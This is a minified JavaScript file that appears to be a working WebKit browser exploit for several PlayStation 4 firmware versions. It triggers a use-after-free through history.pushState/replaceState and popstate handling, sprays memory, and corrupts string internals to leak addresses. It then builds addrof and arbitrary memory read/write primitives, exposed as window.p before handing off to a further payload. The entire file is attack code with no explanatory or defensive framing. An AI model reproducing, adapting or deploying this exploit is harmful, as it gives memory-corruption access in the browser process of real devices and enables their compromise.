import*as config from"./config.mjs";import{read32,read64,write32,write64,sread64}from"./module/rw.mjs";import*as o from"./module/offset.mjs";import{Int}from"./module/int64.mjs";import{Memory}from"./module/mem.mjs";import{die,clear_log,str2array}from"./module/utils.mjs";const ssv_len=(()=>{switch(config.target){case config.ps4_6_00:return 88;case config.ps4_9_00:return 80;case config.ps4_6_50:case config.ps4_8_03:return 72;default:throw RangeError("invalid config.target: "+config.target);}})(),num_reuse=16384,original_strlen=ssv_len-o.size_strimpl,buffer_len=32,num_str=16384,num_gc=30,num_space=19,original_loc=window.location.pathname,loc=original_loc+"#foo";let rstr=null,view_leak_arr=[],jsview=[],s1={views:[]},view_leak=null,input=document.body.appendChild(document.createElement("input")),foo=document.body.appendChild(document.createElement("a"));foo.id="foo";let pressure=null;function gc(a){pressure=Array(100);for(let b=0;b<a;b++){for(let a=0;a<pressure.length;a++)pressure[a]=new Uint32Array(262144);pressure=Array(100)}pressure=null}function sleep(a){return new Promise(b=>setTimeout(b,a))}function prepare_uaf(){history.pushState("state0","");for(let a=0;a<num_space;a++)history.replaceState("state0","");history.replaceState("state1","",loc),history.pushState("state2","");for(let a=0;a<num_space;a++)history.replaceState("state2","")}function free(a){history.replaceState("state3","",original_loc);for(let b,c=0;c<num_reuse;c++){b=new Uint8Array(new ArrayBuffer(ssv_len));for(let a=0;a<b.length;a++)b[a]=65;a.views.push(b)}}function check_spray(a){a.length!==num_reuse&&die("views.length !== num_reuse, restart the entire exploit");for(let b=0;b<num_reuse;b++)if(65!==a[b][0])return b;return null}async function use_after_free(a,b){function c(){0<e&&die("multiple free()s, restart the entire exploit"),free(b),e++}const d=new Promise((c,d)=>{addEventListener("popstate",function(e){try{a(e,b)}catch(a){d(a)}c()},{once:!0})});prepare_uaf();let e=0;input.onblur=c,await new Promise(a=>{input.addEventListener("focus",a,{once:!0}),input.focus()}),history.back(),await d}async function setup_ar(a){const b=a.ab;b[0]=1;for(let c=1;c<b.length;c++)b[c]=0;delete a.views,delete a.pop,gc(num_gc);let c=0;for(const d=8;config.target!==config.ps4_9_00&&(await sleep(d),c+=d,1===b[0]););for(let c=0;;){const a={};c++;for(let b,c=0;c<num_str;c++)b=new String("B".repeat(original_strlen-5)+c.toString().padStart(5,"0")),a[b]=4919;if(66===b[o.strimpl_inline_str])write32(b,o.strimpl_strlen,4294967295);else continue;let d=!1;const e=Object.getOwnPropertyNames(a);for(let a=0;a<e.length;a++)if(255<e[a].length){rstr=e[a],d=!0;break}if(d)return}}async function double_free(a){const b=a.ab;await setup_ar(a);let c=new ArrayBuffer(buffer_len),d=[];const e=64512;for(let b=0;b<65536;b++)b>=e?view_leak_arr.push(new Uint8Array(c)):d.push(new Uint8Array(c));d=null;let f=[];for(let b=0;b<65536-e;b++)f.push({value:1128481603}),f.push({value:view_leak_arr[b]});search:for(;;){Object.defineProperties({},f);for(let a,b=0;8388608>b;b++)if(a=null,67===rstr.charCodeAt(b)&&67===rstr.charCodeAt(b+1)&&67===rstr.charCodeAt(b+2)&&67===rstr.charCodeAt(b+3)&&(0===rstr.charCodeAt(b+8)&&0===rstr.charCodeAt(b+15)&&0===rstr.charCodeAt(b+16)&&0===rstr.charCodeAt(b+23)&&14===rstr.charCodeAt(b+24)&&0===rstr.charCodeAt(b+31)&&0===rstr.charCodeAt(b+40)&&0===rstr.charCodeAt(b+47)&&0===rstr.charCodeAt(b+48)&&0===rstr.charCodeAt(b+55)&&14===rstr.charCodeAt(b+56)&&0===rstr.charCodeAt(b+63)?a=str2array(rstr,8,b+32):67===rstr.charCodeAt(b+16)&&67===rstr.charCodeAt(b+17)&&67===rstr.charCodeAt(b+18)&&67===rstr.charCodeAt(b+19)&&(a=str2array(rstr,8,b+8))),null!==a){view_leak=new Int(a);break search}}let g=read64(b,o.strimpl_m_data);write64(b,o.strimpl_m_data,view_leak);for(let b=0;4>b;b++)jsview.push(sread64(rstr,8*b));write64(b,o.strimpl_m_data,g),write32(b,o.strimpl_strlen,original_strlen)}function find_leaked_view(a,b,c,d){const e=read64(b,o.strimpl_m_data);let f=null;write64(b,o.strimpl_m_data,c);for(const e of d){if(write32(e,0,1094861636),1094861636===sread64(a,0).low()){f=e;break}}return write64(b,o.strimpl_m_data,e),null===f&&die("not found"),f}class Reader{constructor(a,b,c,d){this.rstr=a,this.view_rstr=b,this.leaker=c,this.leaker_addr=d,this.old_m_data=read64(b,o.strimpl_m_data),c.a=0}addrof(a){if("object"!=typeof a&&"function"!=typeof a)throw TypeError("addrof argument not a JS object");this.leaker.a=a,write64(this.view_rstr,o.strimpl_m_data,this.leaker_addr);const b=sread64(this.rstr,o.js_butterfly);write64(this.view_rstr,o.strimpl_m_data,b.sub(16));const c=sread64(this.rstr,0);return write64(this.view_rstr,o.strimpl_m_data,this.old_m_data),c}get_view_vector(a){if(!ArrayBuffer.isView(a))throw TypeError(`object not a JSC::JSArrayBufferView: ${a}`);write64(this.view_rstr,o.strimpl_m_data,this.addrof(a));const b=sread64(this.rstr,o.view_m_vector);return write64(this.view_rstr,o.strimpl_m_data,this.old_m_data),b}}function setup_ssv_data(a){const b=a,c=16,d=config.target===config.ps4_9_00?24:32,e=new Uint8Array(c),f=new Uint8Array(9);write64(e,0,b.get_view_vector(f)),write32(e,8,f.length),write32(e,12,f.length);write32(f,0,6),f[4]=23,write32(f,5,0);const g=new Uint8Array(c),h=new Uint8Array(d);write64(g,0,b.get_view_vector(h)),write32(g,8,1),write32(g,12,1);const i=new Uint8Array(new ArrayBuffer(1));return config.target===config.ps4_9_00?(write64(h,0,b.addrof(i)),write64(h,8,Int.Zero),write64(h,14,Int.Zero),write32(h,20,o.size_view)):(write64(h,0,Int.Zero),write64(h,8,Int.Zero),write64(h,16,b.addrof(i)),write32(h,24,o.size_view)),{m_data:e,m_arrayBufferContentsArray:b.get_view_vector(g),worker:i,nogc:[f,g,h]}}async function setup_arw(a,b){function c(a){f.push(a)}const d=1e3,e=a.ab;let f=[];for(addEventListener("message",c),rstr=null;;){for(let a=0;a<d;a++)postMessage("",origin);for(;f.length!==d;)await sleep(100);if(66!==e[o.strimpl_inline_str])break;f=[]}removeEventListener("message",c);for(let c=0;c<ssv_len;c+=8);const g=[];for(let c=0;c<e.length;c++)g.push(e[c]);const{m_data:h,m_arrayBufferContentsArray:i,worker:j,nogc:k}=b;write64(e,8,read64(h,0)),write64(e,16,read64(h,8)),write64(e,24,i);for(const c of f)if(""!==c.data){const a=new Uint8Array(c.data);for(let a=0;a<o.size_view;a+=8);const b=new Memory(a,j);return window.p={read1(a){a=new Int(a.low,a.hi);const c=b.read8(a);return c},read2(a){a=new Int(a.low,a.hi);const c=b.read16(a);return c},read4(a){a=new Int(a.low,a.hi);const c=b.read32(a);return c},read8(a){a=new Int(a.low,a.hi);const c=b.read64(a);return new int64(c.low(),c.high())},write1(a,c){a=new Int(a.low,a.hi),b.write8(a,c)},write2(a,c){a=new Int(a.low,a.hi),b.write16(a,c)},write4(a,c){a=new Int(a.low,a.hi),b.write32(a,c)},write8(a,c){a=new Int(a.low,a.hi),c instanceof int64?(c=new Int(c.low,c.hi),b.write64(a,c)):b.write64(a,new Int(c))},leakval(a){const c=b.addrof(a);return new int64(c.low(),c.high())}},e.set(g),view_leak_arr=null,view_leak=null,jsview=null,input=null,void(foo=null)}die("no arbitrary r/w")}async function triple_free(a,b,c,d){const e=find_leaked_view(rstr,a.ab,b[2],c);let f=new Reader(rstr,a.ab,e,d);const g=setup_ssv_data(f);f=null,await setup_arw(a,g)}function pop(a,b){let c=check_spray(b.views);null===c?die("failed spray"):(b.pop=a,b.ab=b.views[c])}async function get_ready(){await new Promise(a=>"complete"===document.readyState?void a():void document.addEventListener("DOMContentLoaded",a))}async function run(){await get_ready(),await use_after_free(pop,s1),await sleep(0),await double_free(s1),await triple_free(s1,jsview,view_leak_arr,view_leak),run_hax()}run();